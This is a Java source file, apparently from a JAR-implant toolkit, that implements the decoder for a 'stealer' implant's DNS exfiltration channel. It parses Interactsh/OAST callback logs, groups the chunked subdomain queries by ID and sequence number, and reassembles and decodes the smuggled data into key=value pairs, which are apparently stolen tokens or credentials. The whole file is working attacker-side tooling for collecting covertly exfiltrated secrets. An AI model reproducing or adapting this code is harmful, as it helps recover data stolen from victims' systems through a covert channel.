package io.github.w1th4d.jarplant.implants.utils;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import static io.github.w1th4d.jarplant.implants.StealerExfil.*;

public class StealerExfilDecoder {
    private final static Pattern topDomainValidator = Pattern.compile("[a-zA-Z0-9\\-.]+");
    private final String expectedTopDomain;
    private final Pattern regex;

    StealerExfilDecoder(String expectedTopDomain, Pattern regex) {
        this.expectedTopDomain = expectedTopDomain;
        this.regex = regex;
    }

    public static StealerExfilDecoder create(String expectedTopDomain) throws DecoderException {
        if (!topDomainValidator.matcher(expectedTopDomain).matches()) {
            throw new DecoderException("Invalid top domain '" + expectedTopDomain + "'.");
        }

        /*
         * Including user input in a regex is normally a bad idea (look up "regex bombs").
         * That's why the expectedTopDomain has been validated using its own anti-regex regex. :)
         */
        Pattern regex = Pattern.compile(
                "([a-zA-Z0-9\\-.]+\\." + expectedTopDomain.replace(".", "\\.") + ")",
                Pattern.CASE_INSENSITIVE);

        return new StealerExfilDecoder(expectedTopDomain, regex);
    }

    public Set<String> extractFqdns(String text) {
        Set<String> fqdns = new HashSet<>();

        Matcher matcher = regex.matcher(text);
        while (matcher.find()) {
            if (matcher.groupCount() < 1) {
                continue;
            }
            String fqdn = matcher.group(1).toLowerCase();
            fqdns.add(fqdn);
        }

        return fqdns;
    }

    public Set<String> parseInteractshExport(Path exportFile) throws IOException {
        return parseInteractshExport(Files.readAllBytes(exportFile));
    }

    public Set<String> parseInteractshExport(byte[] exportFileContent) throws JsonProcessingException {
        return parseInteractshExport(new String(exportFileContent, StandardCharsets.UTF_8));
    }

    public Set<String> parseInteractshExport(String exportFileContent) throws JsonProcessingException {
        Set<String> allFqdns = new HashSet<>();

        ObjectMapper jsonParser = new ObjectMapper();
        JsonNode json = jsonParser.readTree(exportFileContent);

        JsonNode appNode = json.get("app");
        JsonNode appJson = new ObjectMapper().readTree(appNode.asText());   // They put JSON in your JSON...
        JsonNode data = appJson.get("data");
        // Maybe some day someone needs to parse terabytes of data. Until that day, we're keeping it simple.
        for (JsonNode dataObj : data) {
            if (!dataObj.get("protocol").asText().equals("dns")) {
                continue;
            }

            JsonNode request = dataObj.get("raw-request");
            if (request != null) {
                Set<String> fqdns = extractFqdns(request.asText());
                allFqdns.addAll(fqdns);
            }

            JsonNode response = dataObj.get("raw-response");
            if (response != null) {
                Set<String> fqdns = extractFqdns(response.asText());
                allFqdns.addAll(fqdns);
            }
        }

        return allFqdns;
    }

    static Set<String> findLongestFqdns(Set<String> fqdns, String expectedTopDomain) {
        final int expectedTopDomainSubdomainCount = expectedTopDomain.split("\\.").length;

        // Group FQDNs by uniqueId
        Map<String, SortedSet<String>> subqueriesPerId = new HashMap<>();
        Comparator<String> sorter = new DnsQueryComparator();
        for (String fqdn : fqdns) {
            // Filter queries for the top domain (like "abc123.oast.fun")
            if (!fqdn.endsWith(expectedTopDomain)) {
                continue;
            }

            // Filter queries that does not contain at least one extra part (the uniqueId+seqNo)
            String[] parts = fqdn.split("\\.");
            if (parts.length <= expectedTopDomainSubdomainCount + 1) {
                continue;
            }

            // Expect this part to be "uniqueId-seqNo"
            String queryId = parts[parts.length - expectedTopDomainSubdomainCount - 1];
            if (queryId.split("-").length != 2) {
                continue;
            }

            // Get or create the list of FQDNs for this uniqueId
            Set<String> subqueries = subqueriesPerId.computeIfAbsent(queryId, k -> new TreeSet<>(sorter));

            subqueries.add(fqdn);
        }

        // For each queryId, go through all subqueries and figure out which one holds all the data
        Set<String> mostCompleteQueries = new HashSet<>(subqueriesPerId.size());
        for (Map.Entry<String, SortedSet<String>> entry : subqueriesPerId.entrySet()) {
            String queryId = entry.getKey();
            SortedSet<String> subqueries = entry.getValue();

            mostCompleteQueries.add(subqueries.first());
        }

        return mostCompleteQueries;
    }

    private static class DnsQueryComparator implements Comparator<String> {
        DnsQueryComparator() {
            super();
        }

        @Override
        public int compare(String self, String other) {
            String[] selfParts = self.toLowerCase().split("\\.");
            String[] otherParts = other.toLowerCase().split("\\.");

            // Do a sanity check while we're at it
            int selfI = selfParts.length - 1;
            int otherI = otherParts.length - 1;
            while (selfI >= 0 && otherI >= 0) {
                String selfPartAtI = selfParts[selfI];
                String otherPartAtI = otherParts[otherI];

                if (!selfPartAtI.equals(otherPartAtI)) {
                    // These aren't even in the same query!
                    throw new DecoderRuntimeException("Subquery mismatch: '" + self + "' and '" + other + "'.");
                }

                selfI--;
                otherI--;
            }

            return otherParts.length - selfParts.length;
        }
    }

    public Map<String, Map<String, String>> decodeFqdn(List<String> fqdns) throws DecoderException {
        Map<String, Map<String, String>> res = new HashMap<>();
        Map<String, Map<Integer, String>> idSeqPart = new HashMap<>();

        Collections.reverse(fqdns);
        for (String fqdn : fqdns) {
            fqdn = fqdn.toLowerCase();
            Pattern idRegex = Pattern.compile("\\.([0-9]+)-([0-9]+)\\." + expectedTopDomain.replace(".", "\\."));
            Matcher idMatcher = idRegex.matcher(fqdn);
            while (idMatcher.find()) {
                if (idMatcher.groupCount() < 2) {
                    continue;
                }
                String id = idMatcher.group(1);
                int seqNo = Integer.parseInt(idMatcher.group(2));
                Map<Integer, String> splitsForId = idSeqPart.get(id);
                if (splitsForId == null) {
                    splitsForId = new HashMap<>();
                    idSeqPart.put(id, splitsForId);
                }
                String dataPart = fqdn.substring(0, fqdn.indexOf("." + id + "-" + seqNo + "." + expectedTopDomain));
                String encodedData = dataPart.replace(".", "");
                String currentValueForSeqNo = splitsForId.get(seqNo);
                if (currentValueForSeqNo != null) {
                    // Collision in uniqueId+sequenceNumber detected
                    if (!currentValueForSeqNo.equals(encodedData)) {
                        // ...and the data is not the same
                        if (encodedData.endsWith(currentValueForSeqNo)) {
                            // ...but this one is a continuation of the data
                            splitsForId.put(seqNo, encodedData);
                        } else if (currentValueForSeqNo.endsWith(encodedData)) {
                            // What we have is greater
                            continue;
                        } else {
                            // It's a complete mismatch
                            throw new DecoderException("Collision detected on sub-query '" + id + "-" + seqNo + "'.");
                        }
                    }
                } else {
                    splitsForId.put(seqNo, encodedData);
                }
            }
        }

        for (Map.Entry<String, Map<Integer, String>> entry : idSeqPart.entrySet()) {
            String id = entry.getKey();
            Map<Integer, String> seq = entry.getValue();

            int seqNo = seq.keySet().stream().max(Comparator.naturalOrder()).orElseThrow();
            StringBuilder allEncodedData = new StringBuilder();
            String encoded;
            while ((encoded = seq.get(seqNo)) != null && seqNo >= 0) {
                allEncodedData.append(encoded);
                seqNo--;
            }
            String decoded = rebase(allEncodedData.toString(), URL_ALPHABET, TOKEN_ALPHABET);
            Map<String, String> structured = decoded.lines()
                    .map(line -> line.split("="))
                    .filter(splits -> splits.length == 2)
                    .collect(Collectors.toUnmodifiableMap(kv -> kv[0], kv -> kv[1]));
            res.put(id, structured);
        }

        return res;
    }
}
